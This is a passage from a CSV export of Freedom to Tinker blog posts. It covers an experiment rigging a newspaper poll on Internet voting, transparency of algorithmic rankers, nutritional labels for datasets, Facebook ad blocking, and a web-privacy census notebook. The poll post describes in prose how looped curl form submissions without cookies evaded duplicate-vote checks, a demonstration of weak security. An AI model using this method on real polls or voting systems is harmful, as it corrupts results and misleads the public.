higher rate of user knowledge and a higher rate of unconstrained user choice required as the risk level increases. Where exactly to draw these lines, and what processes a company should use to avoid stepping over the lines, are left as exercises for the reader."
"307","2013-04-03","2023-03-24","https://freedom-to-tinker.com/2013/04/03/internet-voting-security-wishful-thinking-doesnt-make-it-true/","[The following is a post written at my invitation by Professor Duncan Buell from the University of South Carolina. Curiously, the poll Professor Buell mentions below is no longer listed in the list of past & present polls on the Courier-Journal site, but is available if you kept the link.] On Thursday, March 21, in the midst of Kentucky’s deliberation over allowing votes to be cast over the Internet, the daily poll of the Louisville Courier-Journal asked the readers, “Should overseas military personnel be allowed to vote via the Internet?” This happened the day before their editorial rightly argued against Internet voting at this time. One of the multiple choice answers was “Yes, it can be made just as secure as any balloting system.” This brings up the old adage, “we are all entitled to our own opinions, but we are not entitled to our own facts.” The simple fact is that Internet voting is possible – but it is definitely NOT as secure as some other balloting systems. This is not a matter of opinion, but a matter of fact. Votes cast over the Internet are easily subject to corruption in a number of different ways. To illustrate this point, two colleagues, both former students, wrote simple software scripts that allowed us to vote multiple times in the paper’s opinion poll. We could have done this with repeated mouse clicks on the website, but the scripts allowed us to do it automatically, and by night’s end we had voted 60,000 times. The poll vendor’s website claims that it blocks repeated voting, but that claim is clearly not entirely true. We did not break in to change the totals. We did not breach the security of the Courier-Journal’s computers. We simply used programs instead of mouse clicks to vote on the poll website itself. In one case, the script was a bash script that looped a specified number of times and issued a curl command. My colleague’s comment was: I started by looking at the source code of the website, which is possible with any browser. The poll in question used a HTTP form to submit the result, and only using cookies to prevent duplicate voting. One quick Google search later, I was reading a website about how to submit form data with curl (a linux utility that allows you to send all kinds of HTTP requests from a shell). From there, it was a simple matter of tinkering with the curl command until it submitted the result I wanted, and then looping it to run a large number of times. Curl doesn’t store or use cookies unless you explicitly tell it to, so it avoided the poll’s duplicate voting system entirely. In the other case, what we had was a simple HTML script to enter data into the web form, and the script was run repeatedly with iMacros in Firefox. Each of the scripts was done in about 30 minutes start to finish, and then run on four computers at home (2 + 1 + 1 for the three of us). When we started, just after dinner, the vote was 255 for, 90 against, and 146 “I’d have to be convinced”, with a handful of “no opinion” votes. By 10:30pm, we had collectively voted “no” about 9000 times. By Friday morning, we had voted more than 60,000 times and the poll was running 13 to 1 against. This was a simple online poll that was easily compromised. Internet voting vendor software will be harder to compromise, but this shows that computer security is hard and claims must be proved. Before we entrust critical public functions such as voting to such software, the public deserves a solid demonstration that such claims are truly substantiated, and policy makers need to be schooled in a proper skepticism about computer security. That has not yet happened. There is an irony in hacking an online poll about whether voting can be hacked. But it points to a much-needed dialogue between policy makers and computer security experts. Elections are too important to be entrusted, without proof, to the marketing hype of an Internet voting company. The nation’s real elections should be decided by the voters in the nation’s jurisdictions, not by whichever entity – foreign or domestic – happens to have the best software bots running on any given biennial Tuesday in November."
"308","2016-08-05","2023-03-24","https://freedom-to-tinker.com/2016/08/05/revealing-algorithmic-rankers/","By Julia Stoyanovich (Assistant Professor of Computer Science, Drexel University) and Ellen P. Goodman (Professor, Rutgers Law School) ProPublica’s story on “machine bias” in an algorithm used for sentencing defendants amplified calls to make algorithms more transparent and accountable. It has never been more clear that algorithms are political (Gillespie) and embody contested choices (Crawford), and that these choices are largely obscured from public scrutiny (Pasquale and Citron). We see it in controversies over Facebook’s newsfeed, or Google’s search results, or Twitter’s trending topics. Policymakers are considering how to operationalize “algorithmic ethics” and scholars are calling for accountable algorithms (Kroll, et al.). One kind of algorithm that is at once especially obscure, powerful, and common is the ranking algorithm (Diakopoulos). Algorithms rank individuals to determine credit worthiness, desirability for college admissions and employment, and compatibility as dating partners. They encode ideas of what counts as the best schools, neighborhoods, and technologies. Despite their importance, we actually can know very little about why this person was ranked higher than another in a dating app, or why this school has a better rank than that one. This is true even if we have access to the ranking algorithm, for example, if we have complete knowledge about the factors used by the ranker and their relative weights, as is the case for US News ranking of colleges. In this blog post, we argue that syntactic transparency, wherein the rules of operation of an algorithm are more or less apparent, or even fully disclosed, still leaves stakeholders in the dark: those who are ranked, those who use the rankings, and the public whose world the rankings may shape. Using algorithmic rankers as an example, we argue that syntactic transparency alone will not lead to true algorithmic accountability (Angwin). This is true even if the complete input data is publicly available. We advocate instead for interpretability, which rests on making explicit the interactions between the program and the data on which it acts. An interpretable algorithm allows stakeholders to understand the outcomes, not merely the process by which outcomes were produced. Opacity in Algorithmic Rankers Algorithmic rankers take as input a database of items and produce a ranked list of items as output. The relative ranking of the items may be computed based on an explicitly provided scoring function. Or the ranking function may be learned, using learning-to-rank methods that are deployed extensively in information retrieval and recommender systems. The simplest kind of a ranker is a score-based ranker, which applies a scoring function independently to each item and then sorts the items on their scores. Many of these rankers use monotone aggregation scoring functions, such as weighted sums of attribute values with non-negative weights. In the very simplest case, the score of an item is computed by sorting on the value of just one attribute, i.e., by setting the weight of that attribute to 1 and of all other attributes to 0. This is illustrated in our running example in Table 1, which gives a ranking of 51 computer science departments as per csrankings.org (CSR). We augmented the data with several attributes from the assessment of research-doctorate programs by the National Research Council (NRC) to illustrate some points. Source of an attribute (CSR or NRC) is listed next to the attribute name. We recognize that the augmented CS rankings are already syntactically transparent. What’s more, they provide the entire data set. We use them for illustrative purposes. Table 1: A ranking of Computer Science departments per csrankings.org, with additional attributes from the NRC assessment dataset. Here, the average count computes the geometric mean of the adjusted number of publications in each area by institution, faculty is the number of faculty in the department, pubs is the average number of publications per faculty (2000-2006) , GRE is the average GRE scores (2004-2006). Departments are ranked by average count. Rank (CSR) Name Average Count (CSR) Faculty (CSR) Pubs (NRC) GRE (NRC) 1 Carnegie Mellon University 18.3 122 2 791 2 Massachusetts Institute of Technology 15 64 3 772 3 Stanford University 14.3 55 5 800 4 University of California–Berkeley 11.4 50 3 789 5 University of Illinois–Urbana-Champaign 10.5 55 3 772 full table 45 Yale University 1.5 18 2 800 45 University of Virginia 1.5 18 2 789 45 University of Rochester 1.5 18 3 786 48 Arizona State University 1.4 14 2 787 48 University of Arizona 1.4 18 2 784 48 Virginia Polytechnic Institute and State University 1.4 32 1 780 48 Washington University in St. Louis 1.4 17 2 790 Ranked results are difficult for people to interpret, whether a ranking is computed explicitly or learned, whether the method (e.g., the scoring function or, more generally, the model) is known or unknown, and whether the user can access the entire output or only the highest-ranked items (the top-k). There are several sources of this opacity, illustrated below for score-based rankers. Sources of Opacity Source 1: The scoring formula alone does not indicate the relative rank of an item. Rankings are, by definition, relative, while scores are absolute. Knowing how the score of an item is computed says little about the outcome — the position of a particular item in the ranking, relative to other items. Is 10.5 a high score or a low score? That depends on how 10.5 compares to the scores of other items, for example to the highest attainable score and to the highest score of some actual item in the input. In our example in Table 1 this kind of opacity is mitigated because there is both syntactic transparency (the scoring formula is known) and the input is public. Source 2: The weight of an attribute in the scoring formula does not determine its impact on the outcome. Consider again the example in Table 1, and suppose that we first normalize the values of the attributes, and then compute the score of each department by summing up the values of faculty (with weight 0.2), average count (with weight 0.3) and GRE (with weight 0.5). According to this scoring method, the size of the department (faculty) is the least important factor. Yet, it will be the deciding factor that sets apart top-ranked departments from those in lower ranks, both because the value of this attribute changes most dramatically in the data, and because it correlates with average count (in effect, double-counting). In contrast, GRE is syntactically the most important factor in the formula, yet in this dataset it has very close values for all items, and so has limited actual effect on the ranking. Source 3: The ranking output may be unstable. A ranking may be unstable because of the scores generated on a particular dataset. An example would be tied scores, where the tie is not reflected in the ranking. In this case, the choice of any particular rank order is arbitrary. Moreover, unless raw scores are disclosed, the user has no information about the magnitude of the difference in scores between items that appear in consecutive ranks. In Table 1, CMU (18.3) has a much higher score than the immediately following MIT (15). This is in contrast to, e.g., UIUC (10.5, rank 5) and UW (10.3, rank 6), which are nearly tied. The difference in scores between distinct adjacent ranks decreases dramatically as we move down the list: it is at most 0.3, and usually 0.1, for departments in ranks 16 through 48. CSRankings’ syntactic transparency (disclosing its ranking method to the user) and accessible data allow us to see the instability, but this is unusual. Source 4: The ranking methodology may be unstable. The scoring function may produce vastly different rankings with small changes in attribute weights. This is difficult to detect even with syntactic transparency, and even if the data is public. Malcolm Gladwell discusses this issue and gives compelling examples in his 2011 piece, The Order of Things. In our example in Table 1, a scoring function that is based on a combination of pubs and GRE would be unstable, because the values of these attributes are both very close for many of the items and induce different rankings, and so prioritizing one attribute over the other slightly would cause significant re-shuffling. The opacity concerns described here are all due to the interaction between the scoring formula (or, more generally, an a priori postulated model) and the actual dataset being ranked. In a recent paper, one of us observed that structured datasets show rich correlations between item attributes in the presence of ranking, and that such correlations are often local (i.e., are present in some parts of the dataset but not in others). To be clear, this kind of opacity is present whether or not there is syntactic transparency. Harms of Opacity Opacity in algorithmic rankers can lead to four types of harms: (1) Due process / fairness. The subjects of the ranking cannot have confidence that their ranking is meaningful or correct, or that they have been treated like similarly situated subjects. Syntactic transparency helps with this but it will not solve the problem entirely, especially when people cannot interpret how weighted factors have impacted the outcome (Source 2 above). (2) Hidden normative commitments. A ranking formula implements some vision of the “good.” Unless the public knows what factors were chosen and why, and with what weights assigned to each, it cannot assess the compatibility of this vision with other norms. Even where the formula is disclosed, real public accountability requires information about whether the outcomes are stable, whether the attribute weights are meaningful, and whether the outcomes are ultimately validated against the chosen norms. Did the vendor evaluate the actual effect of the features that are postulated as important by the scoring / ranking mode? Did the vendor take steps to compensate for mutually-reinforcing correlated inputs, and for possibly discriminatory inputs? Was stability of the ranker interrogated on real or realistic inputs? This kind of transparency around validation is important for both learning algorithms which operate according to rules that are constantly in flux and responsive to shifting data inputs, and for simpler score-based rankers that are likewise sensitive to the data. (3) Interpretability. Especially where ranking algorithms are performing a public function (e.g., allocation of public resources or organ donations) or directly shaping the public sphere (e.g., ranking politicians), political legitimacy requires that the public be able to interpret algorithmic outcomes in a meaningful way. At the very least, they should know the degree to which the algorithm has produced robust results that improve upon a random ordering of the items (a ranking-specific confidence measure). In the absence of interpretability, there is a threat to public trust and to democratic participation, raising the dangers of an algocracy (Danaher) – rule by incontestable algorithms. (4) Meta-methodological assessment. Following on from the interpretability concerns is a meta question about whether a ranking algorithm is the appropriate method for shaping decisions. There are simply some domains, and some instances of datasets, in which rank order is not appropriate. For example, if there are very many ties or near-ties induced by the scoring function, or if the ranking is too unstable, it may be better to present data through an alternative mechanism such as clustering. More fundamentally, we should question the use of an algorithmic process if its effects are not meaningful or if it cannot be explained. In order to understand whether the ranking methodology is valid, as a first order question, the algorithmic process needs to be interpretable. The Possibility of Knowing Recent scholarship on the issue of algorithmic accountability has devalued transparency in favor of verification. The claim is that because algorithmic processes are protean and extremely complex (due to machine learning) or secret (due to trade secrets or privacy concerns), we need to rely on retrospective checks to ensure that the algorithm is performing as promised. Among these checks would be cryptographic techniques like zero knowledge proofs (Kroll, et al.) to confirm particular features, audits (Sandvig) to assess performance, or reverse engineering (Perel and Elkin-Koren) to test cases. These are valid methods of interrogation, but we do not want to give up on disclosure. Retrospective testing puts a significant burden on users. Proofs are useful only when you know what you are looking for. Reverse engineering with test cases can lead to confirmation bias. All these techniques put the burden of inquiry exclusively on individuals for whom interrogation may be expensive and ultimately fruitless. The burden instead should fall more squarely on the least cost avoider, which will be the vendor who is in a better position to reveal how the algorithm works (even if only partially). What if food manufacturers resisted disclosing ingredients or nutritional values, and instead we were put to the trouble of testing their products or asking them to prove the absence of a substance? That kind of disclosure by verification is very different from having a nutritional label. What would it take to provide the equivalent of a nutritional label for the process and the outputs of algorithmic rankers? What suffices as an appropriate and feasible explanation depends on the target audience. For an individual being ranked, a useful description would explain his specific ranked outcome and suggest ways to improve the outcome. What changes can NYU CS make to improve its ranking? Why is the NYU CS department ranked 24? Which attributes make this department perform worse than those ranked higher? As we argued above, the answers to these questions depend on the interaction between the ranking method and the dataset over which the ranker operates. When working with data that is not public (e.g., involving credit or medical information about individuals), an explanation mechanism of this kind must be mindful of any privacy considerations. Individually-responsive disclosures could be offered in a widget that allows ranked entities to experiment with the results by changing the inputs. An individual consumer of a ranked output would benefit from a concise and intuitive description of the properties of the ranking. Based on this explanation, users will get a glimpse of, e.g., the diversity (or lack thereof) that the ranking exhibits in terms of attribute values. Both attributes that comprise the scoring function, if known (or, more generally, features that make part of the model), and attributes that co-occur or even correlate with the scoring attributes, can be described explicitly. In our example in Table 1, a useful explanation may be that a ranking on average count will over-represent large departments (with many faculty) at the top of the list, while GRE does not strongly influence rank. Figure 1: A hypothetical Ranking Facts label. Figure 1 presents a hypothetical “nutritional label” for rankings, using the augmented CSRankings in Table 1 as input. Inspired by Nutrition Facts, our Ranking Facts label is aimed at the consumer, such as a prospective CS program applicant, and addresses three of the four opacity sources described above: relativity, impact, and output stability. We do not address methodological stability in the label. How this dimension should be quantified and presented to the user is an open technical problem. The Ranking Facts show how the properties of the 10 highest-ranked items compare to the entire dataset (Relativity), making explicit cases where the ranges of values, and the median value, are different at the top-10 vs. overall (median is marked with red triangles for faculty size and average publication count). The label lists the attributes that have most impact on the ranking (Impact), presents the scoring formula (if known), and explains which attributes correlate with the computed score. Finally, the label graphically shows the distribution of scores (Stability), explaining that scores differ significantly up to top-10 but are nearly indistinguishable in later positions. Something like the Rankings Facts makes the process and outcome of algorithmic ranking interpretable for consumers, and reduces the likelihood of opacity harms, discussed above. Beyond Ranking Facts, it is important to develop Interpretability tools that enable vendors to design fair, meaningful and stable ranking processes, and that support external auditing. Promising technical directions include, e.g., quantifying the influence of various features on the outcome under different assumptions about availability of data and code, and investigating whether provenance techniques can be used to generate explanations."
"309","2018-05-03","2023-03-24","https://freedom-to-tinker.com/2018/05/03/refining-the-concept-of-a-nutritional-label-for-data-and-models/","By Julia Stoyanovich (Assistant Professor of Computer Science at Drexel University) and Bill Howe (Associate Professor in the Information School at the University of Washington) In August 2016, Julia Stoyanovich and Ellen P. Goodman spoke in this forum about the importance of bringing interpretability to the algorithmic transparency debate. They focused on algorithmic rankers, discussed the harms of opacity, and argued that the burden on making ranked outputs transparent rests with the producer of the ranking. They went on to propose a “nutritional label” for rankings called Ranking Facts. In this post, Julia Stoyanovich and Bill Howe discuss their recent technical progress on bringing the idea of Ranking Facts to life, placing the nutritional label metaphor in the broader context of the ongoing algorithmic accountability and transparency debate. In 2016, we began with a specific type of nutritional label that focuses on algorithmic rankers. We have since developed a Web-based Ranking Facts tool, which will be presented at the upcoming ACM SIGMOD 2018 conference. Figure 1: Ranking Facts on the CS departments dataset. The Ingredients widget (green) has been expanded to show the details of the attributes that strongly influence the ranking. The Fairness widget (blue) has been expanded to show details of the fairness computation. Figure 1 presents Ranking Facts for CS department rankings, the same dataset as was used for illustration in our August 2016 post. The nutritional label was constructed automatically, and consists of a collection of visual widgets, each with an overview and a detailed view. Recipe widget succinctly describes the ranking algorithm. For example, for score-based ranker that uses a linear scoring formula to assign as score to each item, each attribute would be listed together with its weight. Ingredients widget lists attributes most material to the ranked outcome, in order of importance. For example, for a linear model, this list could present the attributes with the highest learned weights. Stability widget explains whether the ranking methodology is robust on this particular dataset – would small changes in the data, such as those due to uncertainty or noise, result in significant changes in the ranked order? Fairness and Diversity widgets quantify whether the ranked outcome exhibits parity (according to some measure – three such measures are presented in Figure 1), and whether the set of results is diverse with respect to one or several demographic characteristics. What’s new about nutritional labels? The database and cyberinfrastructure communities have been studying systems and standards for metadata, provenance, and transparency for decades. For example, the First Provenance Challenge in 2008 led to the creation of the Open Provenance Model that standardized years of previous efforts across multiple communities, We are now seeing renewed interest in these topics due to the proliferation of machine learning applications that use data opportunistically. Several projects are emerging that explore this concept, including Dataset Nutrition Label at the Berkman Klein Center at Harvard & the MIT Media Lab, Datasheets for Datasets, and some emerging work about Data Statements for NLP datasets from Bender and Friedman. In our work, we are interested in automating the creation of nutritional labels, for both datasets and models, and in providing open source tools for others to use in their projects. Is a nutritional label simply an apt new name for an old idea? We think not! We see nutritional labels as a unifying metaphor that is responsive to changes in how data is being used today. Datasets are now increasingly used to train models to make decisions once made by humans. In these automated systems, biases in the data are propagated and amplified with no human in the loop. The bias, and the effect of the bias on the quality of decisions made, is not easily detectable due to the relative opacity of the system. As we have seen time and time again, models will appear to work well, but will silently and dangerously reinforce discrimination. Worse, these models will legitimize the bias — “the computer said so.” So we are designing nutritional labels for data and models to respond specifically to the harms implied by these scenarios, in contrast to the more general concept of just “data about data.” Use cases for nutritional labels: Enhancing data sharing in the public sector Since we first began discussing nutritional labels in 2016, we’ve seen increased interest from the public sector in scenarios where data sharing is considered high-risk. Nutritional labels can be used to support data sharing, while mitigating some of the associated risks. Consider these examples: Algorithmic transparency law in New York City New York City recently passed a law requiring that a task force be put in place to survey the current use of “automated decision systems,” defined as “computerized implementations of algorithms, including those derived from machine learning or other data processing or artificial intelligence techniques, which are used to make or assist in making decisions,” in City agencies. The task force will develop a set of recommendations for enacting algorithmic transparency, which, as we argued in our testimony before the New York City Council Committee on Technology regarding Automated Processing of Data, cannot be achieved without data transparency. Nutritional labels can support data transparency and interpretability, surfacing the statistical properties of a dataset, the methodology that was used to produce it, and, ultimately, substantiating the “fitness for use” of a dataset in the context of a specific automated decision system or task. Addressing the opioid epidemic An effective response to the opioid epidemic requires coordination between at least three sectors: health care, criminal justice, and emergency housing. An optimization problem is to effectively, fairly and transparently assign resources, such as hospital rooms, jail cells, and shelter beds, to at-risk citizens. Yet, centralizing all data is disallowed by law, and solving the global optimization problem is therefore difficult. We’ve seen interest in nutritional labels to share the details of local resource allocation strategies, to help bootstrap a coordinated response without violating data sharing principles. In this case the nutritional labels are shared separately from the datasets themselves. Mitigating urban homelessness With the Bill and Melinda Gates Foundation, we are integrating data about homeless families from multiple government agencies and non-profits to understand how different pathways through the network of services affect outcomes. Ultimately, we are using machine learning to deliver prioritized recommendations to specific families. But the families and case workers need to understand how a particular recommendation was made, so they can in turn make an informed decision about whether to follow it. For example, income levels, substance abuse issues, or health issues may all affect the recommendation, but only the families themselves know whether the information is reliable. Sharing transportation data At the University of Washington, we are developing the Transportation Data Collaborative, an honest broker system that can provide reports and research to policy makers while maintaining security and privacy for sensitive information about companies and individuals. We are releasing nutritional labels for reports, models, and synthetic datasets that we produce to share known biases about the data and our methods of protecting privacy. Properties of a nutritional label To differentiate a nutritional label from more general forms of metadata, we articulate several properties: Comprehensible: The label is not a complete (and therefore overwhelming) history of every processing step applied to produce the result. This approach has its place and has been extensively studied in the literature on scientific workflows, but is unsuitable for the applications we target. The information on a nutritional label must be short, simple, and clear. Consultative: Nutritional labels should provide actionable information, rather than just descriptive metadata. For example, universities may invest in research to improve their ranking, or consumers may cancel unused credit card accounts to improve their credit score. Comparable: Nutritional labels enable comparisons between related products, implying a standard. Concrete: The label must contain more than just general statements about the source of the data; such statements do not provide sufficient information to make technical decisions on whether or not to use the data. Data and models are chained together into complex automated pipelines — computational systems “consume” datasets at least as often as people do, and therefore also require nutritional labels! We articulate additional properties in this context: Computable: Although primarily intended for human consumption, nutritional labels should be machine-readable to enable specific applications: data discovery, integration, automated warnings of potential misuse. Composable: Datasets are frequently integrated to construct training data; the nutritional labels must be similarly integratable. In some situations, the composed label is simple to construct: the union of sources. In other cases, the biases may interact in complex ways: a group may be sufficiently represented in each source dataset, but underrepresented in their join. Concomitant: The label should be carried with the dataset; systems should be designed to propagate labels through processing steps, modifying the label as appropriate, and implementing the paradigm of transparency by design. Going forward We are interested in the application of nutritional labels at various stages in the data science lifecycle: Data scientists triage datasets for use to train their models; data practitioners inspect and validate trained models before deploying them in their domains; consumers review nutritional labels to understand how decisions that affect them were made and how to respond. The software infrastructure implied by nutritional labels suggests a number of open questions for the computer science community: Under what circumstances can nutritional labels be generated automatically for a given dataset or model? Can we automatically detect and report potential misuse of datasets or models, given the information in a nutritional label? We’ve suggested that nutritional labels should be computable, composable, and concomitant — carried with the datasets to which they pertain; how can we design systems that accommodate these requirements? We look forward to opening these discussions with the database community at two upcoming events: at ACM SIGMOD 2018, where we are organizing a special session on a technical research agenda in data ethics and responsible data management, and at VLDB 2018, where we will run a debate on data and algorithmic ethics."
"310","2016-08-05","2023-03-24","https://freedom-to-tinker.com/2016/08/05/supplement-for-revealing-algorithmic-rankers-table-1/","Table 1: A ranking of Computer Science departments per csrankings.org, with additional attributes from the NRC assessment dataset. Here, the average count computes the geometric mean of the adjusted number of publications in each area by institution, faculty is the number of faculty in the department, pubs is the average number of publications per faculty (2000-2006) , GRE is the average GRE scores (2004-2006). Departments are ranked by average count. Rank (CSR) Name Average Count (CSR) Faculty (CSR) Pubs (NRC) GRE (NRC) 1 Carnegie Mellon University 18.3 122 2 791 2 Massachusetts Institute of Technology 15 64 3 772 3 Stanford University 14.3 55 5 800 4 University of California–Berkeley 11.4 50 3 789 5 University of Illinois–Urbana-Champaign 10.5 55 3 772 6 University of Washington 10.3 50 2 796 7 Georgia Institute of Technology 8.9 81 2 797 8 University of California–San Diego 7.8 49 3 797 9 Cornell University 6.9 45 2 800 10 University of Michigan 6.8 63 3 800 11 University of Texas–Austin 6.6 43 3 789 12 Columbia University 6.3 49 3 788 13 University of Massachusetts–Amherst 6.2 47 2 796 14 University of Maryland–College Park 5.5 42 2 791 15 University of Wisconsin–Madison 5.1 35 2 793 16 University of Southern California 4.4 47 3 793 17 University of California–Los Angeles 4.3 32 3 797 18 Northeastern University 4 46 2 797 19 Purdue University–West Lafayette 3.6 42 2 772 20 Harvard University 3.4 29 3 794 20 University of Pennsylvania 3.4 32 3 800 22 University of California–Santa Barbara 3.2 28 4 793 22 Princeton University 3.2 27 2 796 24 New York University 3 29 2 796 24 Ohio State University 3 39 3 798 26 University of California–Davis 2.9 27 2 771 27 Rutgers The State University of New Jersey–New Brunswick 2.8 33 2 758 27 University of Minnesota–Twin Cities 2.8 37 2 777 29 Brown University 2.5 24 2 768 30 Northwestern University 2.4 35 1 787 31 Pennsylvania State University 2.3 28 3 790 31 Texas A & M University–College Station 2.3 36 1 775 33 State University of New York–Stony Brook 2.2 33 3 796 33 Indiana University–Bloomington 2.2 35 1 765 33 Duke University 2.2 22 3 800 33 Rice University 2.2 18 2 800 37 University of Utah 2.1 29 2 776 37 Johns Hopkins University 2.1 24 2 766 39 University of Chicago 2 28 2 779 40 University of California–Irvine 1.9 28 2 787 41 Boston University 1.6 15 2 783 41 University of Colorado–Boulder 1.6 32 1 761 41 University of North Carolina–Chapel Hill 1.6 22 2 794 41 Dartmouth College 1.6 18 2 794 45 Yale University 1.5 18 2 800 45 University of Virginia 1.5 18 2 789 45 University of Rochester 1.5 18 3 786 48 Arizona State University 1.4 14 2 787 48 University of Arizona 1.4 18 2 784 48 Virginia Polytechnic Institute and State University 1.4 32 1 780 48 Washington University in St. Louis 1.4 17 2 790"
"311","2016-08-11","2023-03-24","https://freedom-to-tinker.com/2016/08/11/can-facebook-really-make-ads-unblockable/","[This is a joint post with Grant Storey, a Princeton undergraduate who is working with me on a tool to help users understand Facebook’s targeted advertising.] Facebook announced two days ago that it would make its ads indistinguishable from regular posts, and hence impossible to block. But within hours, the developers of Adblock Plus released an update which enabled the tool to continue blocking Facebook ads. The ball is now back in Facebook’s court. So far, all it’s done is issue a rather petulant statement. The burning question is this: can Facebook really make ads indistinguishable from content? Who ultimately has the upper hand in the ad blocking wars? There are two reasons — one technical, one legal — why we don’t think Facebook will succeed in making its ads unblockable, if a user really wants to block them. The technical reason is that the web is an open platform. When you visit facebook.com, Facebook’s server sends your browser the page content along with instructions on how to render them on the screen, but it is entirely up to your browser to follow those instructions. The browser ultimately acts on behalf of the user, and gives you — through extensions — an extraordinary degree of control over its behavior, and in particular, over what gets displayed on the screen. This is what enables the ecosystem of ad-blocking and tracker-blocking extensions to exist, along with extensions for customizing web pages in various other interesting ways. Indeed, the change that Adblock Plus made in order to block the new, supposedly unblockable ads is just a single line in the tool’s default blocklist: facebook.com##div[id^=""substream_""] div[id^=""hyperfeed_story_id_""][data-xt] What’s happening here is that Facebook’s HTML code for ads has slight differences from the code for regular posts, so that Facebook can keep things straight for its own internal purposes. But because of the open nature of the web, Facebook is forced to expose these differences to the browser and to extensions such as Adblock Plus. The line of code above allows Adblock Plus to distinguish the two categories by exploiting those differences. Facebook engineers could try harder to obfuscate the differences. For example, they could use non-human-readable element IDs to make it harder to figure out what’s going on, or even randomize the IDs on every page load. We’re surprised they’re not already doing this, given the grandiose announcement of the company’s intent to bypass ad blockers. But there’s a limit to what Facebook can do. Ultimately, Facebook’s human users have to be able to tell ads apart, because failure to clearly distinguish ads from regular posts would run headlong into the Federal Trade Commission’s rules against misleading advertising — rules that the commission enforces vigorously. [1, 2] And that’s the second reason why we think Facebook is barking up the wrong tree. Facebook does allow human users to easily recognize ads: currently, ads say “Sponsored” and have a drop-down with various ad-related functions, including a link to the Ad Preferences page. And that means someone could create an ad-blocking tool that looks at exactly the information that a human user would look at. Such a tool would be mostly immune to Facebook’s attempts to make the HTML code of ads and non-ads indistinguishable. Again, the open nature of the web means that blocking tools will always have the ability to scan posts for text suggestive of ads, links to Ad Preferences pages, and other markers. But don’t take our word for it: take our code for it instead. We’ve created a prototype tool that detects Facebook ads without relying on hidden HTML code to distinguish them. [Update: the source code is here.] The extension examines each post in the user’s news feed and marks those with the “Sponsored” link as ads. This is a simple proof of concept, but the detection method could easily be made much more robust without incurring a performance penalty. Since our tool is for demonstration purposes, it doesn’t block ads but instead marks them as shown in the image below. All of this must be utterly obvious to the smart engineers at Facebook, so the whole “unblockable ads” PR push seems likely to be a big bluff. But why? One possibility is that it’s part of a plan to make ad blockers look like the bad guys. Hand in hand, the company seems to be making a good-faith effort to make ads more relevant and give users more control over them. Facebook also points out, correctly, that its ads don’t contain active code and aren’t delivered from third-party servers, and therefore aren’t as susceptible to malware. Facebook does deserve kudos for trying to clean up and improve the ad experience. If there is any hope for a peaceful resolution to the ad blocking wars, it is that ads won’t be so annoying as to push people to install ad blockers, and will be actually useful at least some of the time. If anyone can pull this off, it is Facebook, with the depth of data it has about its users. But is Facebook’s move too little, too late? On most of the rest of the web, ads continue to be creepy malware-ridden performance hogs, which means people will continue to install ad blockers, and as long as it is technically feasible for ad blockers to block Facebook ads, they’re going to continue to do so. Let’s hope there’s a way out of this spiral. [1] Obligatory disclaimer: we’re not lawyers. [2] Facebook claims that Adblock Plus’s updates “don’t just block ads but also posts from friends and Pages”. What they’re most likely referring to that Adblock Plus blocks ads that are triggered by one of your friends Liking the advertiser’s page. But these are still ads: somebody paid for them to appear in your feed. Facebook is trying to blur the distinction in its press statement, but it can’t do that in its user interface, because that is exactly what the FTC prohibits."
"312","2017-06-09","2023-03-24","https://freedom-to-tinker.com/2017/06/09/web-census-notebook-a-new-tool-for-studying-web-privacy/","As part of the Web Transparency and Accountability Project, we’ve been visiting the web’s top 1 million sites every month using our open-source privacy measurement tool OpenWPM. This has led to numerous worrying findings such as the systematic abuse of newly introduced web features for fingerprinting, leading to better privacy tools and occasionally strong responses from browser vendors. Enabling research is great — OpenWPM has led to 14 papers so far — but research is slow and requires expertise. To make our work more directly useful, today we’re announcing a new tool to study web privacy: a Jupyter notebook interface and a set of libraries to quickly answer most questions about web tracking by querying the the 500 GB of data we collect every month. Jupyter notebook is an intuitive tool for data analysis using Python, and it’s what we use here internally for much of our own research. Notebooks are accessible with a simple web interface; yet the code, data, and memory persists on the server if you close the browser and return to it later (even from a different device). Notebooks combine code with visualizations, making them ideal for data exploration and analysis. Who could benefit from this tool? We envision uses such as these: Publishers could use our data to understand third-party tracking on their own websites. Journalists could use our data to investigate and expose privacy-infringing practices. Regulators and enforcement agencies could use our tool in investigations. Creators of browser privacy tools could use our data to test their effectiveness. Let’s look at an example that shows the feel of the interface. The code below computes the average number of embedded trackers on the top 100 websites in various categories such as “news” and “shopping”. It is intuitive and succinct. Without our interface, not only would the SQL version of this query be much more cumbersome, but it would require a ton of legwork and setup to even get to a point where you can write the query. Now you just need to point your browser at our notebook. for category, domains in census.first_parties.alexa_categories.items(): avg = sum(1 for first_party in domains[:100] for third_party in first_party.third_party_resources if third_party.is_tracker) / 100 print(""Average number of trackers on %s sites: %.1f"" % (category, avg)) The results confirm our finding that news sites have the most trackers, and adult sites the least. [1] Here’s what happens behind the scenes: census is a Python object that exposes all the relationships between websites and third parties as object attributes, hiding the messy details of the underlying database schema. Each first party is represented by a FirstParty object that gives access to each third-party resource (URI object) on the first party, and the ThirdParty that the URI belongs to. When the objects are accessed, they are instantiated automatically by querying the database. census.first_parties is a container of FirstParty objects ordered by Alexa traffic rank, so you can easily analyze the top sites, or sites in the long tail, or specific sites. You can also easily slice the sites by category: in the example above, we iterate through each category of census.first_parties.alexa_categories. There’s a fair bit of logic that goes into analyzing the crawl data which third parties are embedded on which websites, and cross-referencing that with tracking-protection lists to figure out which of those are trackers. This work is already done for you, and exposed via attributes such as ThirdParty.is_tracker. Since the notebooks run on our server, we expect to be able to support only a limited number (a few dozen) at this point, so you need to apply for access. The tool is currently in beta as we smooth out rough edges and add features, but it is usable and useful. Of course, you’re welcome to run the notebook on your own server — the underlying crawl datasets are public, and we’ll release the code behind the notebooks soon. We hope you find this of use to you, and we welcome your feedback. [1] The linked graph from our paper measures the number of distinct domains whereas the query above counts every instance of every tracker. The trends are the same in both cases, but the numbers are different. Here’s the output of the query: Average number of third party trackers on computers sites: 41.0 Average number of third party trackers on regional sites: 68.8 Average number of third party trackers on recreation sites: 58.2 Average number of third party trackers on health sites: 38.4 Average number of third party trackers on news sites: 151.2 Average number of third party trackers on business sites: 55.0 Average number of third party trackers on kids_and_teens sites: 74.8 Average number of third party trackers on home sites: 94.5 Average number of third party trackers on arts sites: 108.6 Average number of third party trackers on sports sites: 86.6 Average number of third party trackers on reference sites: 43.8 Average number of third party trackers on science sites: 43.1 Average number of third party trackers on society sites: 73.5 Average number of third party trackers on shopping sites: 53.1 Average number of third party trackers on adult sites: 16.8 Average number of third party trackers on games sites: 70.5"
